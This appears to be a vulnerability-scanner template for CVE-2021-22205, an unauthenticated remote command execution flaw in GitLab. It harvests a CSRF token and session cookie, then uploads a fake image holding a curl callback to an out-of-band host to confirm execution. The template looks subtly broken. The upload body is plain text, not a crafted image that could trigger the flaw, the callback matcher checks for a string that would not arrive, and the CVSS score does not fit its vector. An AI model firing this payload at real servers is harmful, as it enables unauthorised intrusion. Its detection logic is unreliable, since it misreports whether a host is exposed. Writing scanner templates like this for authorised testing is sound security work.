id: cve-2021-22205
info:
  name: GitLab CE/EE Unauthenticated RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    GitLab CE/EE versions starting from 11.9 are vulnerable to unauthenticated remote command execution due to improper image file validation. An attacker can exploit this to execute arbitrary commands on the server.
  reference:
    - https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/
  classification:
    cve-id: CVE-2021-22205
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.9

variables:
  random_jpg_name: '{{rand_text_alphanumeric(6)}}'
  random_cmd: '{{rand_text_alphanumeric(16)}}'

flow: |
  http(1) && http(2)

http:
  - id: fetch-csrf-cookie
    method: GET
    path:
      - "{{BaseURL}}/users/sign_in"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: header
        regex:
          - "Set-Cookie: _gitlab_session=.*;"
      - type: regex
        part: body
        regex:
          - 'name="csrf-token" content="(.*?)" />'
    extractors:
      - type: regex
        name: csrf_token
        part: body
        regex:
          - 'name="csrf-token" content="(.*?)" />'
        group: 1
        internal: true
      - type: regex
        name: gitlab_session
        part: header
        regex:
          - "Set-Cookie: _gitlab_session=(.*?);"
        group: 1
        internal: true

  - id: exploit-upload
    method: POST
    path:
      - "{{BaseURL}}/uploads/user"
    headers:
      X-Csrf-Token: '{{csrf_token}}'
      X-Requested-With: XMLHttpRequest
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxtxB7nI0mjqg3VoV
      Cookie: '_gitlab_session={{gitlab_session}}'
    body: |
      ------WebKitFormBoundaryxtxB7nI0mjqg3VoV
      Content-Disposition: form-data; name="file"; filename="{{random_jpg_name}}.jpg"
      Content-Type: image/jpeg

      dummy_start_marker
      curl http://{{interactsh-url}}
      dummy_end_marker
      ------WebKitFormBoundaryxtxB7nI0mjqg3VoV--
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
      - type: word
        part: interactsh_request
        words:
          - "curl http://"
